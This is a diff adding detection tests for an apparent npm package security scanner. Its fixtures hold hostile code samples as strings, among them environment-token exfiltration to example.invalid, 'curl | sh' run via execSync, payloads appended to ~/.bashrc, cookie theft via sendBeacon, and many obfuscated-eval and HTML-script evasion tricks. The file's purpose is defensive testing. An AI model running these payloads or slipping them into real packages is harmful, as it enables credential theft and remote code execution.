@@ -630,6 +630,552 @@ describe("review", () => {
     });
   });
 
+  test("still flags aliased, enumerated and presence-then-read environment access", () => {
+    const samples = [
+      "const env = process.env || {};\nfetch('https://example.invalid', { body: JSON.stringify(env) });\n",
+      "if ('NPM_TOKEN' in process.env) fetch('https://example.invalid?t=' + process.env.NPM_TOKEN);\n",
+      "const t = process.env && Object.keys(process.env);\nfetch('https://example.invalid', { body: t });\n",
+      "var e; const v = null==(e=null==process?void 0:process.env)?void 0:e.NPM_TOKEN;\nfetch('https://example.invalid?t=' + v);\n",
+    ];
+    for (const textSample of samples) {
+      const staged = [{ path: "index.js", size: 120, sha256: "env-read", flags: [], textSample }];
+      const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+      expect(
+        findings.find((finding) => finding.ruleId === "code.credential-access"),
+        textSample,
+      ).toMatchObject({
+        severity: "high",
+        evidence: expect.stringContaining("credential read paired with network egress"),
+      });
+    }
+  });
+
+  test("scans only script elements and inline handlers in markup", () => {
+    const staged = [
+      {
+        path: "site/index.html",
+        size: 220,
+        sha256: "markup",
+        flags: [],
+        textSample:
+          "<pre>fetch(&#x27;/get&#x27;)\ncurl -X GET http://localhost:3000/get</pre>\n" +
+          "<script>\nnavigator.sendBeacon('https://example.invalid', document.cookie);\nfetch('https://example.invalid/c');\n</script>\n" +
+          "<img src=x onerror=\"eval(atob('ZmV0Y2goKQ=='))\">\n",
+      },
+      {
+        path: "site/usage.txt",
+        size: 60,
+        sha256: "usage",
+        flags: [],
+        textSample: "fetch('http://localhost:3000/get')\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings.filter((finding) => finding.file === "site/usage.txt")).toEqual([]);
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.network-access",
+          file: "site/index.html",
+          line: 5,
+        }),
+        expect.objectContaining({
+          ruleId: "code.dynamic-evaluation",
+          file: "site/index.html",
+          line: 7,
+        }),
+      ]),
+    );
+  });
+
+  test("counts base64 decoding only beside an execution or network sink", () => {
+    const decodeOnly = [
+      {
+        path: "codec.js",
+        size: 90,
+        sha256: "codec",
+        flags: [],
+        textSample:
+          "export const decode = (text) => new Uint8Array(Buffer.from(text, 'base64'));\n",
+      },
+    ];
+    const decodeAndSend = [
+      {
+        path: "geo.js",
+        size: 120,
+        sha256: "geo",
+        flags: [],
+        textSample:
+          "const host = Buffer.from('ZXhhbXBsZS5pbnZhbGlk', 'base64').toString();\nrequire('https').get('https://' + host);\n",
+      },
+    ];
+    const decodeAndRun = [
+      {
+        path: "run.js",
+        size: 120,
+        sha256: "run",
+        flags: [],
+        textSample: "const code = atob(payload);\nrequire('child_process').execSync(code);\n",
+      },
+    ];
+    const ruleIds = (staged) =>
+      deterministicFindings(staged, createPackageDiff([], staged)).map((f) => f.ruleId);
+
+    expect(ruleIds(decodeOnly)).not.toContain("code.dynamic-evaluation");
+    expect(ruleIds(decodeAndSend)).toContain("code.dynamic-evaluation");
+    expect(ruleIds(decodeAndRun)).toContain("code.dynamic-evaluation");
+  });
+
+  test("keeps global, indirect and shim-laundered eval while ignoring method-named eval", () => {
+    const evalFindings = (textSample) => {
+      const staged = [{ path: "index.js", size: 80, sha256: "eval", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.dynamic-evaluation",
+      );
+    };
+
+    expect(evalFindings("client.eval(script, 1, key);\n")).toEqual([]);
+    expect(evalFindings("var g = g || new Function('return this')();\n")).toEqual([]);
+    expect(evalFindings("globalThis.eval(payload);\n")).toHaveLength(1);
+    expect(evalFindings("(0, eval)('this');\n")).toEqual([]);
+    expect(evalFindings("new Function('return this')().eval(payload);\n")).toHaveLength(1);
+  });
+
+  test("does not read minified property tables as secrets but keeps literal values", () => {
+    const secretFindings = (path, textSample) => {
+      const staged = [{ path, size: 120, sha256: path, flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "file.secret-content",
+      );
+    };
+
+    expect(
+      secretFindings(
+        "panel.js",
+        "var a={password:!0,range:!0,search:!0,tel:!0};function L(t){this.token=t,this.line=1,this.column=0}\n",
+      ),
+    ).toEqual([]);
+    expect(secretFindings("config.js", 'const apiKey = "FAKE-live-000000000000";\n')).toHaveLength(
+      1,
+    );
+    expect(secretFindings("config.yml", "password: FAKE-s3cr3t-000000\n")).toHaveLength(1);
+  });
+
+  test("demotes a credential-named file only when no secret is recognized in it", () => {
+    const file = (path, textSample) => ({ path, size: 40, sha256: path, flags: [], textSample });
+    const previous = [file("lib/test.env", "PORT=3000\n")];
+    const staged = [
+      file("lib/test.env", "PORT=3000\n"),
+      file(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n"),
+      file("deploy.env", "API_TOKEN=FAKE-000000000000000000\n"),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(previous, staged)).filter(
+      (finding) => finding.ruleId === "file.secret-content",
+    );
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          file: "lib/test.env",
+          severity: "medium",
+          evidence: expect.stringContaining(
+            "credential-named file without recognized secret content",
+          ),
+        }),
+        expect.objectContaining({ file: ".npmrc", severity: "high" }),
+        expect.objectContaining({ file: "deploy.env", severity: "critical" }),
+      ]),
+    );
+  });
+
+  test("scans data and markup formats whole once something loads them as code", () => {
+    const record = (path, textSample) => ({
+      path,
+      size: textSample.length,
+      sha256: path,
+      flags: [],
+      textSample,
+    });
+    const payload = "require('child_process').execSync('curl https://example.invalid/x | sh');\n";
+    const cases = [
+      [
+        { name: "pkg", version: "1.0.0", scripts: { postinstall: "node install.txt" } },
+        [record("install.txt", payload)],
+        "install.txt",
+      ],
+      [
+        { name: "pkg", version: "1.0.0", scripts: { postinstall: "node setup.html" } },
+        [record("setup.html", payload)],
+        "setup.html",
+      ],
+      [
+        { name: "pkg", version: "1.0.0", main: "lib/core.css" },
+        [record("lib/core.css", payload)],
+        "lib/core.css",
+      ],
+      [
+        { name: "pkg", version: "1.0.0", main: "index.js" },
+        [record("index.js", "require('./data.map');\n"), record("data.map", payload)],
+        "data.map",
+      ],
+      [
+        { name: "pkg", version: "1.0.0", main: "index.js" },
+        [
+          record("index.js", "module.exports = 1;\n"),
+          record("lib/loader.js", "require(__dirname + '/p.txt');\n"),
+          record("lib/p.txt", payload),
+        ],
+        "lib/p.txt",
+      ],
+    ];
+    for (const [manifest, files, payloadPath] of cases) {
+      const staged = [record("package.json", JSON.stringify(manifest)), ...files];
+      const findings = deterministicFindings(staged, createPackageDiff([], staged), manifest);
+
+      expect(
+        findings.find(
+          (finding) => finding.ruleId === "code.remote-shell" && finding.file === payloadPath,
+        ),
+        payloadPath,
+      ).toMatchObject({ severity: "critical" });
+    }
+
+    const unloaded = [record("package.json", '{"name":"pkg"}'), record("notes.txt", payload)];
+    expect(
+      deterministicFindings(unloaded, createPackageDiff([], unloaded)).filter(
+        (finding) => finding.file === "notes.txt",
+      ),
+    ).toEqual([]);
+  });
+
+  test("still counts decoding that feeds a compiler, loader, timer or disk write", () => {
+    const samples = [
+      "Function(atob(p))();\n",
+      "require('vm').runInThisContext(Buffer.from(p, 'base64').toString());\n",
+      "vm.runInNewContext(atob(p));\n",
+      "require(atob('Y2hpbGRfcHJvY2Vzcw=='));\n",
+      "setTimeout(atob(p));\n",
+      "require('fs').writeFileSync(target, Buffer.from(p, 'base64'));\nrequire(target);\n",
+      "module._compile(Buffer.from(p, 'base64').toString(), file);\n",
+      "import('data:text/javascript,' + atob(p));\n",
+      "(0, eval)(atob(p));\n",
+      "const run = eval;\nrun(atob(p));\n",
+      "const F = Function;\nF(atob(p))();\n",
+      "Reflect.construct(Function, [atob(p)]);\n",
+      "[].constructor.constructor(atob(p))();\n",
+      "new Worker(atob(p), { eval: true });\n",
+      "const u = 'data:text/javascript,' + atob(p);\nimport(u);\n",
+      "require('fs').appendFileSync(require('os').homedir() + '/.bashrc', atob(p));\n",
+      "require('fs').writeFileSync(__dirname + '/x.js', Buffer.from(p, 'base64'));\nrequire('./x.js');\n",
+    ];
+    for (const textSample of samples) {
+      const staged = [{ path: "run.js", size: 80, sha256: "run", flags: [], textSample }];
+      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (f) => f.ruleId,
+      );
+
+      expect(ruleIds, textSample).toContain("code.dynamic-evaluation");
+    }
+  });
+
+  test("keeps python decoding ungated", () => {
+    const staged = [
+      {
+        path: "pkg/loader.py",
+        size: 80,
+        sha256: "loader",
+        flags: [],
+        textSample: "import base64, pickle\npickle.loads(base64.b64decode(P))\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
+      codePatternSet: "python",
+    });
+
+    expect(findings.map((finding) => finding.ruleId)).toContain("code.dynamic-evaluation");
+  });
+
+  test("keeps eval laundered through the global shim, other globals or optional calls", () => {
+    const evalFindings = (textSample) => {
+      const staged = [{ path: "index.js", size: 80, sha256: "eval", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.dynamic-evaluation",
+      );
+    };
+
+    expect(evalFindings("var root = freeGlobal || Function('return this')();\n")).toEqual([]);
+    for (const laundered of [
+      "(new Function('return this')()).eval(p);\n",
+      "new Function('return this')()?.eval(p);\n",
+      "top.eval(p);\n",
+      "globalThis?.eval(p);\n",
+      "eval?.(p);\n",
+    ]) {
+      expect(evalFindings(laundered), laundered).toHaveLength(1);
+    }
+  });
+
+  test("still counts an assignment alias of process.env read for a common name", () => {
+    const staged = [
+      {
+        path: "index.js",
+        size: 90,
+        sha256: "alias",
+        flags: [],
+        textSample:
+          "const mode = (e = process.env).NODE_ENV;\nfetch('https://example.invalid', { body: JSON.stringify(e) });\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
+      severity: "high",
+    });
+  });
+
+  test("scans unquoted inline handlers in markup", () => {
+    const staged = [
+      {
+        path: "site/index.html",
+        size: 80,
+        sha256: "handler",
+        flags: [],
+        textSample: "<p>docs</p>\n<img src=x onerror=eval(atob('ZmV0Y2goKQ=='))>\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "code.dynamic-evaluation",
+          file: "site/index.html",
+          line: 2,
+        }),
+      ]),
+    );
+  });
+
+  test("recognizes punctuated passwords and literal npm auth values", () => {
+    const secretSeverity = (path, textSample) => {
+      const staged = [{ path, size: 60, sha256: path, flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).find(
+        (finding) => finding.ruleId === "file.secret-content",
+      )?.severity;
+    };
+
+    expect(secretSeverity("config.yml", "password: Sup3r$ecretP@ss!\n")).toBe("critical");
+    expect(secretSeverity(".env.local", "DB_PASSWORD=P@ssw0rd!2024xyz\n")).toBe("critical");
+    expect(
+      secretSeverity(
+        ".npmrc",
+        "//registry.npmjs.org/:_authToken=00000000-0000-4000-8000-000000000000\n",
+      ),
+    ).toBe("critical");
+    expect(secretSeverity(".npmrc", "_auth=ZmFrZTpmYWtlLWZpeHR1cmU=\n")).toBe("critical");
+  });
+
+  test("does not treat compiler and loader calls without a decode as dynamic evaluation", () => {
+    const samples = [
+      'Function("r", "regeneratorRuntime = r")(runtime);\n',
+      "var run = Function(handler);\n",
+      "result = Function(importsKeys, sourceURL + 'return ' + source).apply(undefined, importsValues);\n",
+      "vm.runInContext(code, this._globalProxy);\n",
+      "module._compile(js.code, filename);\n",
+      "var g = (0, eval)('this');\n",
+      "/** @param func { Function(offset: number) => number } */\n",
+    ];
+    for (const textSample of samples) {
+      const staged = [{ path: "lib.js", size: 80, sha256: "lib", flags: [], textSample }];
+      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (f) => f.ruleId,
+      );
+
+      expect(ruleIds, textSample).not.toContain("code.dynamic-evaluation");
+    }
+  });
+
+  test("does not read documentation placeholders or minified operators as secrets", () => {
+    const secretFindings = (path, textSample) => {
+      const staged = [{ path, size: 60, sha256: path, flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "file.secret-content",
+      );
+    };
+
+    expect(secretFindings("README.md", "//registry.npmjs.org/:_authToken=MYTOKEN1\n")).toEqual([]);
+    expect(secretFindings("docs/npmrc.html", "_authToken=YOUR_NPM_TOKEN\n")).toEqual([]);
+    expect(
+      secretFindings("lib/a.js", "var pass=n.pass!==void 0?n.pass:x.token!==void 0;\n"),
+    ).toEqual([]);
+    expect(secretFindings("lib/b.js", "x.password=n.password!==void 0&&y;\n")).toEqual([]);
+    expect(secretFindings(".npmrc", "//registry.npmjs.org/:_authToken=<your-token>\n")).toEqual([
+      expect.objectContaining({ severity: "high" }),
+    ]);
+  });
+
+  test("recognizes semicolon-delimited connection string passwords", () => {
+    const staged = [
+      {
+        path: "appsettings.json",
+        size: 90,
+        sha256: "settings",
+        flags: [],
+        textSample:
+          '{"ConnectionStrings":{"Default":"Server=db;User Id=sa;Password=Sup3rSecretPass1;Database=x"}}\n',
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(findings.find((finding) => finding.ruleId === "file.secret-content")).toMatchObject({
+      severity: "critical",
+    });
+  });
+
+  test("keeps script hidden behind a fake close tag or in a javascript: URL", () => {
+    const staged = [
+      {
+        path: "site/index.html",
+        size: 120,
+        sha256: "markup-evasion",
+        flags: [],
+        textSample:
+          "<script>/*</scriptx>*/eval(atob('ZmV0Y2goKQ=='))</script>\n" +
+          "<a href=\"javascript:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n",
+      },
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
+      (finding) => finding.ruleId === "code.dynamic-evaluation",
+    );
+
+    expect(findings).toEqual([expect.objectContaining({ file: "site/index.html", line: 1 })]);
+    const javascriptUrlOnly = [
+      { ...staged[0], textSample: "<p>docs</p>\n" + staged[0].textSample.split("\n")[1] },
+    ];
+    expect(
+      deterministicFindings(javascriptUrlOnly, createPackageDiff([], javascriptUrlOnly)).find(
+        (finding) => finding.ruleId === "code.dynamic-evaluation",
+      ),
+    ).toMatchObject({ line: 2 });
+  });
+
+  test("checks thousands of data files against load calls in linear time", () => {
+    const staged = [
+      {
+        path: "index.js",
+        size: 10,
+        sha256: "i",
+        flags: [],
+        textSample: "require(x + y);\n".repeat(20_000),
+      },
+      ...Array.from({ length: 2_500 }, (_, i) => ({
+        path: `styles/s${i}.css`,
+        size: 10,
+        sha256: `s${i}`,
+        flags: [],
+        textSample: "a{color:red}\n",
+      })),
+    ];
+    const started = performance.now();
+    deterministicFindings(staged, createPackageDiff([], staged));
+    expect(performance.now() - started).toBeLessThan(3000);
+  });
+
+  test("counts decoding reached through aliases, constructors and other runtimes", () => {
+    const samples = [
+      "const run = eval\nrun(atob(p))\n",
+      "var e = globalThis.eval; e(atob(p));\n",
+      "const { eval: run } = globalThis;\nrun(atob(p));\n",
+      "eval.call(null, atob(p));\n",
+      "(() => {}).constructor(atob(p))();\n",
+      "Object.constructor(atob(p))();\n",
+      "const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;\nnew AsyncFunction(atob(p));\n",
+      "new W(atob(p), { eval: !0 });\n",
+      "new WebAssembly.Module(Buffer.from(p, 'base64'));\n",
+      "document.write(atob(p));\n",
+    ];
+    for (const textSample of samples) {
+      const staged = [{ path: "index.js", size: 80, sha256: "idx", flags: [], textSample }];
+      const ruleIds = deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (f) => f.ruleId,
+      );
+
+      expect(ruleIds, textSample).toContain("code.dynamic-evaluation");
+    }
+  });
+
+  test("scans markup whole when a script-capable attribute spells code with references", () => {
+    const dynamicEvaluation = (textSample) => {
+      const staged = [{ path: "site/page.html", size: 80, sha256: "page", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.dynamic-evaluation",
+      );
+    };
+
+    expect(
+      dynamicEvaluation("<img src=x onerror=\"&#101;val(atob('ZmV0Y2goKQ=='))\">\n"),
+    ).toHaveLength(1);
+    expect(
+      dynamicEvaluation("<a href=\"java&#x09;script:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n"),
+    ).toHaveLength(1);
+    expect(
+      dynamicEvaluation("<a href=\"java\tscript:eval(atob('ZmV0Y2goKQ=='))\">x</a>\n"),
+    ).toHaveLength(1);
+    expect(
+      dynamicEvaluation('<a href="/docs?a=1&amp;b=2">x</a>\n<pre>atob(&#x27;x&#x27;)</pre>\n'),
+    ).toEqual([]);
+  });
+
+  test("follows a template-literal load path to a data file", () => {
+    const record = (path, textSample) => ({ path, size: 40, sha256: path, flags: [], textSample });
+    const staged = [
+      record("package.json", '{"name":"pkg","main":"index.js"}'),
+      record("index.js", "require(`./${name}.txt`);\n"),
+      record(
+        "payload.txt",
+        "require('child_process').execSync('curl https://example.invalid | sh');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged));
+
+    expect(
+      findings.find((f) => f.ruleId === "code.remote-shell" && f.file === "payload.txt"),
+    ).toMatchObject({
+      severity: "critical",
+    });
+  });
+
+  test("does not read connection-string placeholders or property reads as passwords", () => {
+    const secretFindings = (textSample) => {
+      const staged = [{ path: "lib/db.js", size: 80, sha256: "db", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "file.secret-content",
+      );
+    };
+
+    expect(secretFindings("const c = `Server=${host};User Id=sa;Password=${pwd};`;\n")).toEqual([]);
+    expect(secretFindings("// Server=db;User Id=sa;Password=<password>;\n")).toEqual([]);
+    expect(secretFindings("o.host=e.host;password=e.password;\n")).toEqual([]);
+  });
+
+  test("scans adversarial markup and env whitespace in linear time", () => {
+    const run = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: path, flags: [], textSample }];
+      const started = performance.now();
+      deterministicFindings(staged, createPackageDiff([], staged));
+      return performance.now() - started;
+    };
+
+    expect(run("site/index.html", "<script>".repeat(64 * 1024))).toBeLessThan(2000);
+    expect(run("site/handlers.html", '<a onclick="'.repeat(40 * 1024))).toBeLessThan(2000);
+    expect(run("index.js", `process.env${"\n".repeat(128 * 1024)}`)).toBeLessThan(2000);
+    expect(run("site/attrs.html", `<p x=${" ".repeat(128 * 1024)}y>`)).toBeLessThan(2000);
+    expect(run("site/refs.html", `<a href="${"&#x".repeat(40 * 1024)}`)).toBeLessThan(2000);
+    expect(run("lib/conn.js", "Host=".repeat(40 * 1024))).toBeLessThan(2000);
+  });
+
   test("does not flag placeholder URL credentials as secret content", () => {
     // requests' HISTORY.md CVE-2023-32681 entry (`http://user:pass@proxy`) is
     // the canonical benign hit: doc-style placeholder passwords are not leaks.
